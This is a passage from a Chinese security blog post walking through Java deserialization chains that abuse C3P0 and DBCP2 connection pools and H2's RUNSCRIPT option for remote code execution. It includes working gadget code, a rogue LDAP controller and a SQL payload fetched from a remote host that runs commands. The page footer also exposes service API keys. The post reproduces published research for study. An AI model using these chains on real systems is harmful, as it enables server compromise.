+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">H2JDBCCB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        dataSource.setUrl(<span class="string">&quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8008/poc.sql&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造BeanComparator</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, java.util.Collections.reverseOrder());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造恶意PriorityQueue</span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射将property的值设置成databaseMetaData(即，调用getDatabaseMetaData())</span></span><br><span class="line">        Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;databaseMetaData&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将恶意的dataSource对象写入到PriorityQueue的queue中</span></span><br><span class="line">        <span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueArray[<span class="number">0</span>] = dataSource;</span><br><span class="line">        queueArray[<span class="number">1</span>] = dataSource;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        ByteArrayOutputStream baos= <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>反序列化时，通过<code>JdbcRowSetImpl.getDatabaseMetaData()-&gt;this.connect()-&gt;DriverManager.getConnection()</code>来调用getConnection()方法</p>
+<p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230419144617330.png" alt="image-20230419144617330"></p>
+<p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230419145828354.png" alt="image-20230419145828354"></p>
+<p>与TemplatesImpl 类似，在Java高版本中，这是一个内部Java 类，不能再使用反射访问。因此我们不能直接使用它，但可以通过滥用 JDBC池来进行使用。</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/">Make JDBC Attacks Brilliant Again I</a></p>
+<h1 id="5-利用JDBC池化"><a href="#5-利用JDBC池化" class="headerlink" title="5. 利用JDBC池化"></a>5. 利用JDBC池化</h1><blockquote>
+<p>JDBC 池是一种用于管理 Java 应用程序中的数据库连接的机制。</p>
+<p>在 JDBC 池中，预先创建并维护一组数据库连接，以供应用程序使用。当应用程序需要访问数据库时，它会从池中请求一个连接，当它使用完连接后，会将它返回到池中而不是关闭它。这使应用程序能够重用现有连接并避免每次需要访问数据库时创建新连接的开销。</p>
+</blockquote>
+<p>常见的JDBC连接池库：</p>
+<table>
+<thead>
+<tr>
+<th>Implementation</th>
+<th>Remark</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HikariCP</td>
+<td>现代实现，不包括许多序列化类</td>
+</tr>
+<tr>
+<td>Commons DBCP</td>
+<td>Apache 连接池版本 1，提供 JNDI Gadgets</td>
+</tr>
+<tr>
+<td>Commons DBCP2</td>
+<td>Apache 连接池版本 2，提供 JNDI Gadgets</td>
+</tr>
+<tr>
+<td>Druid</td>
+<td>阿里巴巴JDBC连接池</td>
+</tr>
+<tr>
+<td>C3PO</td>
+<td>提供一个直接的Gadget (ComboPooledDataSource)</td>
+</tr>
+<tr>
+<td>Tomcat JDBC</td>
+<td>Tomcat JDBC 池实现，不包括许多序列化类</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>注意：一些JDBC驱动程序(如：MariaDB)提供了它们自己的池化实现，可以在没有池库的情况下使用。</p>
+</blockquote>
+<h2 id="5-1-示例1：C3PO-ComboPooledDataSource-和-H2"><a href="#5-1-示例1：C3PO-ComboPooledDataSource-和-H2" class="headerlink" title="5.1. 示例1：C3PO ComboPooledDataSource 和 H2"></a>5.1. 示例1：C3PO ComboPooledDataSource 和 H2</h2><p>C3PO ComboPooledDataSource将会获取JDBC连接字符串并将其传递给 JDBC 驱动程序管理器，从而创建一个新实例。这可以与任何JDBC驱动程序一起使用，使其成为一个非常通用的Gadget。</p>
+<p>只需将上面H2JDBCCB1的代码中的JDBC连接部分进行更改，并设置property为connection即可：</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">H2JDBCCB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ComboPooledDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComboPooledDataSource</span>();</span><br><span class="line">        dataSource.setJdbcUrl(<span class="string">&quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8008/poc.sql&#x27;&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        ...<span class="comment">//省略重复代码</span></span><br><span class="line">        Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;connection&quot;</span>);</span><br><span class="line">        ...<span class="comment">//省略重复代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>与上面<strong>示例1：PostgeSQL JDBC驱动程序</strong>类似，会抛出异常，解决方法，依旧是增加vm参数：</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-opens java.base/java.util=ALL-UNNAMED</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230419154706778.png" alt="image-20230419154706778"></p>
+<h2 id="5-2-示例2：Apache-Commons-DBCP2-和-H2"><a href="#5-2-示例2：Apache-Commons-DBCP2-和-H2" class="headerlink" title="5.2. 示例2：Apache Commons DBCP2 和 H2"></a>5.2. 示例2：Apache Commons DBCP2 和 H2</h2><p>利用Apache Commons DBCP2进行远程远程代码执行，可以使用<code>SharedPoolDataSource</code>。</p>
+<p>调用<code>getConnection</code>时，会触发以下链：</p>
+<ol>
+<li>对攻击者控制的源(LDAP 服务)执行 JNDI 调用；</li>
+<li>使用<a target="_blank" rel="noopener" href="https://github.com/h2database/h2database/blob/master/h2/src/main/org/h2/jdbcx/JdbcDataSourceFactory.java">H2 数据源对象工厂</a>和从 JNDI 调用接收到的属性创建一个新的JdbcDataSource实例；</li>
+<li>在创建的实例上调用<code>getConnection()</code>。</li>
+</ol>
+<p>1.通过JNDI调用的JNDI源代码，方法是根据<a target="_blank" rel="noopener" href="https://twitter.com/artsploit">Artsploits </a><a target="_blank" rel="noopener" href="https://github.com/artsploit/rogue-jndi">rogue-jndi </a>写一个控制器扩展：</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> artsploit.controllers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> artsploit.Config;</span><br><span class="line"><span class="keyword">import</span> artsploit.Utilities;</span><br><span class="line"><span class="keyword">import</span> artsploit.annotations.LdapMapping;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"></span><br><span class="line"><span class="meta">@LdapMapping(uri = &#123; &quot;/o=h2&quot; &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">H2JDBCLDAP</span> <span class="keyword">implements</span> <span class="title class_">LdapController</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendResult</span><span class="params">(InMemoryInterceptedSearchResult result, String base)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Sending LDAP ResourceRef result for &quot;</span> + base + <span class="string">&quot; with H2 payload&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payloadURL</span> <span class="operator">=</span> <span class="string">&quot;http://&quot;</span> + Config.hostname + <span class="string">&quot;:&quot;</span> + Config.httpPort + Config.h2; <span class="comment">//get from config if not specified</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;&quot;</span> + payloadURL + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">h2Reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;org.h2.jdbcx.JdbcDataSource&quot;</span>, <span class="string">&quot;org.h2.jdbcx.JdbcDataSourceFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        h2Reference.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;driverClassName&quot;</span>, <span class="string">&quot;org.h2.Driver&quot;</span>));</span><br><span class="line">        h2Reference.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;url&quot;</span>, jdbcUrl));</span><br><span class="line">        h2Reference.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;sa&quot;</span>));</span><br><span class="line">        h2Reference.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;sa&quot;</span>));</span><br><span class="line">        h2Reference.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;description&quot;</span>, <span class="string">&quot;H2 connection&quot;</span>));</span><br><span class="line">        h2Reference.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;loginTimeout&quot;</span>, <span class="string">&quot;3&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">        e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;java.lang.String&quot;</span>); <span class="comment">//could be any</span></span><br><span class="line">        e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Utilities.serialize(h2Reference));</span><br><span class="line"></span><br><span class="line">        result.sendSearchEntry(e);</span><br><span class="line">        result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>注意：</p>
+<p>在Config.java中添加</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Parameter(names = &#123;&quot;--h2&quot;&#125;, description = &quot;[H2JDBCLDAP payload option] SQL file with command payload&quot;, order = 4)</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="string">&quot;/poc.sql&quot;</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>在HttpServer.java添加</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&quot;/poc.sql&quot;</span>:</span><br><span class="line">    <span class="type">String</span> <span class="variable">pocSql</span> <span class="operator">=</span> <span class="string">&quot;CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException &#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\tjava.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;);\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;return s.hasNext() ? s.next() : \&quot;\&quot;;  &#125;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;$$;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;CALL SHELLEXEC(&#x27;calc&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">    httpExchange.sendResponseHeaders(<span class="number">200</span>, pocSql.getBytes().length);</span><br><span class="line">    httpExchange.getResponseBody().write(pocSql.getBytes());</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p>运行LDAP 服务：</p>
+<p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230419200812208.png" alt="image-20230419200812208"></p>
+<p>2.将上面H2JDBCCB1的代码中的JDBC连接部分进行更改：</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">H2JDBCCB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">SharedPoolDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SharedPoolDataSource</span>();</span><br><span class="line">        dataSource.setDataSourceName(<span class="string">&quot;ldap://192.168.28.1:1389/o=h2&quot;</span>);</span><br><span class="line">        <span class="comment">//省略</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>3.运行H2JDBCCB1，可见反序列化执行成功：</p>
+<p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230419195331533-16819052140851.png" alt="image-20230419195331533"></p>
+<p>DBCP2在序列化对象中存储已用连接池的引用。反序列化对象时，它会尝试通过调用<code>InstanceKeyDataSourceFactory.getObjectIntance()</code>来重用该池。</p>
+<p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230420112901109.png" alt="image-20230420112901109"></p>
+<p>可以通过提供一个空引用来进行“绕过”它：</p>
+<p>（1）提供前</p>
+<p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230420115747030.png" alt="image-20230420115747030"></p>
+<p>（2）提供后</p>
+<p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230420144525984.png" alt="image-20230420144525984"></p>
+<blockquote>
+<p>连接池引用是一个简单的数字，存储为字符串（“1”、“2”）。假设至少有一个连接池（这就是为什么首先要有连接池），攻击者可以简单地“使用”该引用，因为连接池是否指向不同的数据库并不重要。</p>
+</blockquote>
+<h1 id="6-其他"><a href="#6-其他" class="headerlink" title="6. 其他"></a>6. 其他</h1><p>文章中提到的拓展思路：</p>
+<p>类似于H2 JDBC连接字符串中的“INIT”功能，一些 JDBC 池库允许为以下用例配置 SQL 查询：</p>
+<ul>
+<li>新连接的初始化</li>
+<li>验证现有连接</li>
+</ul>
+<p>根据提供的数据库，这可能会在开发过程中被滥用。</p>
+<p>如：</p>
+<p>在 HSQLDB 2.7.1 之前，可以通过 SQL 执行任意静态 Java 方法 (CVE-2022-41853)。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://github.com/iSafeBlue/presentation-slides/blob/main/BCS2022-%E6%8E%A2%E7%B4%A2JNDI%E6%94%BB%E5%87%BB.pdf">BCS2022-探索JNDI攻击.pdf</a>，调用System.setProperty并使用它来将<code>com.sun.jndi.rmi.object.trustURLCodebase</code>设置为true，从而重新启用JNDI 中的远程类加载，可以像之前一样远程执行代码：</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CALL <span class="string">&quot;java.lang.System.setProperty&quot;</span>(<span class="string">&#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27;</span>, <span class="string">&#x27;true&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>当应用程序尝试将攻击者提供的Gadget chain转换为预期对象时，会触发异常。在执行验证查询之前，数据库连接可能已经终止。初始化查询应该有效。</p>
+</blockquote>
+<h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>本篇主要对参考文章中提到的思路进行了分析和实现。</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://mogwailabs.de/en/blog/2023/04/look-mama-no-templatesimpl/">Look Mama, no TemplatesImpl</a></p>
+<p><a target="_blank" rel="noopener" href="https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/">Make JDBC Attacks Brilliant Again I</a></p>
+<p><a target="_blank" rel="noopener" href="https://pyn3rd.github.io/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/">Make JDBC Attacks Brilliant Again II</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.itguest.com/post/dbgce2b4.html">JDK17遇到报错 module java.base does not “opens java.util“ to unnamed module 问题解决</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/flydean/p/12680291.html">在Spring Boot使用H2内存数据库</a></p>
+
+    </div>
+<div id="copyright">
+	<style>
+		#easter-egg{
+			border:0;
+			padding:10px 0;
+			position:relative
+		}
+		#easter-egg::before{
+			font-family:"Font Awesome 5 Free";
+			font-weight:900;
+			content:"本文结束 \f1b0  感谢阅读";
+			position:absolute;
+			padding:0 10px;
+			line-height:1px;
+			white-space:nowrap;
+			left:50%;
+			transform:translateX(-50%)
+		}
+	</style>
+	<hr id="easter-egg">
+		<blockquote style="padding:0">
+			<p>文章作者: <a href="http://www.qwzf.top"><a1>Qwzf</a1></a></p><p>版权声明: 本博客所有文章除特别声明外, 均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)"><a1>CC BY-NC-ND 4.0</a1></a> 许可协议, 转载请注明来自<a href="http://www.qwzf.top"><a1>Qwzf</a1></a>
+			</p>
+		</blockquote>
+	<hr>
+</div>
+</article>
+
+<div class="blog-post-comments">
+  <section id="comment">
+    <div id="valine_container" class="valine_thread"></div>
+  </section>
+  <script src="https://unpkg.com/leancloud-storage@4.12.0/dist/av-min.js"></script>
+  <script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script>
+  <script>
+    var GUEST_INFO = ["nick", "mail", "link"];
+    var guest_info = "nick,mail,link"
+      .split(",")
+      .filter(function (item) {
+        return GUEST_INFO.indexOf(item) > -1;
+      });
+    var valine = new Valine();
+    valine.init({
+      el: "#valine_container",
+      appId: "vihbOgzz5Eb29milJno9PPDZ-gzGzoHsz",
+      appKey: "dvbSF5qYS9kRoHk2VpzSXBW3",
+      placeholder: "评论一下~",
+      pageSize: "15",
+      avatar: "mp",
+      lang: "zh-cn",
+      emojiCDN: "//i0.hdslb.com/bfs/emote/",
+      // 表情title和图片映射
+      emojiMaps: {
+        "tv_doge": "6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png",
+        "tv_亲亲": "a8111ad55953ef5e3be3327ef94eb4a39d535d06.png",
+        "tv_偷笑": "bb690d4107620f1c15cff29509db529a73aee261.png",
+        "tv_再见": "180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png",
+        "tv_冷漠": "b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png",
+        "tv_发怒": "34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png",
+        "tv_发财": "34db290afd2963723c6eb3c4560667db7253a21a.png",
+        "tv_可爱": "9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png",
+        "tv_吐血": "09dd16a7aa59b77baa1155d47484409624470c77.png",
+        "tv_呆": "fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png",
+        "tv_呕吐": "9f996894a39e282ccf5e66856af49483f81870f3.png",
+        "tv_困": "241ee304e44c0af029adceb294399391e4737ef2.png",
+        "tv_坏笑": "1f0b87f731a671079842116e0991c91c2c88645a.png",
+        "tv_大佬": "093c1e2c490161aca397afc45573c877cdead616.png",
+        "tv_大哭": "23269aeb35f99daee28dda129676f6e9ea87934f.png",
+        "tv_委屈": "d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png",
+        "tv_害羞": "a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png",
+        "tv_尴尬": "7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png",
+        "tv_微笑": "70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png",
+        "tv_思考": "90cf159733e558137ed20aa04d09964436f618a1.png",
+        "tv_惊吓": "0d15c7e2ee58e935adc6a7193ee042388adc22af.png",
+        "tv_打脸": "56ab10b624063e966bfcb76ea5dc4794d87dfd47.png",
+        "tv_抓狂": "fe31c08edad661d63762b04e17b8d5ae3c71a757.png",
+        "tv_抠鼻": "c666f55e88d471e51bbd9fab9bb308110824a6eb.png",
+        "tv_斜眼笑": "911f987aa8bc1bee12d52aafe62bc41ef4474e6c.png",
+        "tv_无奈": "ea8ed89ee9878f2fece2dda0ea8a5dbfe21b5751.png",
+        "tv_晕": "5443c22b4d07fb1907ccc610c8e6db254f2461b7.png",
+        "tv_流汗": "cead1c351ab8d79e9f369605beb90148db0fbed3.png",
+        "tv_流泪": "7e71cde7858f0cd50d74b0264aa26db612a8a167.png",
+        "tv_流鼻血": "c32d39db2737f89b904ca32700d140a9241b0767.png",
+        "tv_点赞": "f85c354995bd99e28fc76c869bfe42ba6438eff4.png",
+        "tv_生气": "26702dcafdab5e8225b43ffd23c94ac1ff932654.png",
+        "tv_生病": "8b0ec90e6b86771092a498c54f09fc94621c1900.png",
+        "tv_疑问": "0793d949b18d7be716078349c202c15ff166f314.png",
+        "tv_白眼": "c1d59f439e379ee50eef488bcb5e5378e5044ea4.png",
+        "tv_皱眉": "72ccad6679fea0d14cce648b4d818e09b8ffea2d.png",
+        "tv_目瞪口呆": "0b8cb81a68de5d5365212c99375e7ace3e7891b7.png",
+        "tv_睡着": "8b196675b53af58264f383c50ad0945048290b33.png",
+        "tv_笑哭": "1abc628f6d4f4caf9d0e7800878f4697abbc8273.png",
+        "tv_腼腆": "89712c0d4af73e67f89e35cbc518420380a7f6f4.png",
+        "tv_色": "61822c7e9aae5da76475e7892534545336b23a6f.png",
+        "tv_调侃": "4bc022533ef31544ca0d72c12c808cf4a1cce3e3.png",
+        "tv_调皮": "b9c41de8e82dd7a8515ae5e3cb63e898bf245186.png",
+        "tv_鄙视": "6e72339f346a692a495b123174b49e4e8e781303.png",
+        "tv_闭嘴": "c9e990da7f6e93975e25fd8b70e2e290aa4086ef.png",
+        "tv_难过": "87f46748d3f142ebc6586ff58860d0e2fc8263ba.png",
+        "tv_馋": "fc7e829b845c43c623c8b490ee3602b7f0e76a31.png",
+        "tv_鬼脸": "0ffbbddf8a94d124ca2f54b360bbc04feb6bbfea.png",
+        "tv_黑人问号": "45821a01f51bc867da9edbaa2e070410819a95b2.png",
+        "tv_鼓掌": "1d21793f96ef4e6f48b23e53e3b9e42da833a0f6.png"
+      },
+    });
+  </script>
+</div>
+
+
+
+  <script>
+    //检测推送
+    var pushType = "sc";
+    var pushLink = "https://sctapi.ftqq.com/SCT215794Tq1sKSSkGQoRqkCjMXEPx2fqH.send";
+    var siteName = "Qwzf";
+
+    var ValineButton = document.getElementsByClassName("vsubmit vbtn")[0];
+    //分情况推送
+    if (pushType === "cp") {
+      var title = siteName + "上又有新评论啦~!\n";
+      function send_valine_CoolPush() {
+        //获取元素信息
+        var pagename = document.title;
+        var wz = pagename.indexOf("|");
+        var res = pagename.substring(0, wz);
+        var pageurl = document.URL;
+        var ptime = new Date();
+        var vnick = document.getElementsByClassName("vnick vinput")[0].value;
+        var vmail = document.getElementsByClassName("vmail vinput")[0].value;
+        var vlink = document.getElementsByClassName("vlink vinput")[0].value;
+        var veditor = document.getElementsByClassName("veditor vinput")[0].value;
+        var data =
+          "昵称: " +
+          vnick +
+          "\n\n邮箱: " +
+          vmail +
+          "\n\n网站地址: " +
+          vlink +
+          "\n\n当前页面: " +
+          pagename +
+          "\n\n评论内容: " +
+          veditor +
+          "\n\n跳转链接: " +
+          pageurl +
+          "\n\n评论时间: " +
+          ptime.toLocaleString();
+        var httpRequest = new XMLHttpRequest(); //第一步：创建需要的对象
+        httpRequest.open("POST", pushLink, true); //第二步：打开连接
+        httpRequest.setRequestHeader(
+          "Content-type",
+          "application/json"
+        ); //设置请求头 注：post方式必须设置请求头（在建立连接后设置请求头）
+        var payload = { "t": title, "c": data }
+        httpRequest.send(JSON.stringify(payload)); //发送请求 将情头体写在send中
+      }
+      ValineButton.onclick = send_valine_CoolPush;
+    }
+  </script>
+    
+        <div id="footer-post-container">
+    <div id="footer-post">
+
+        <div id="nav-footer" style="display: none">
+            <ul>
+                
+                    <li><a href="/">首页</a></li>
+                
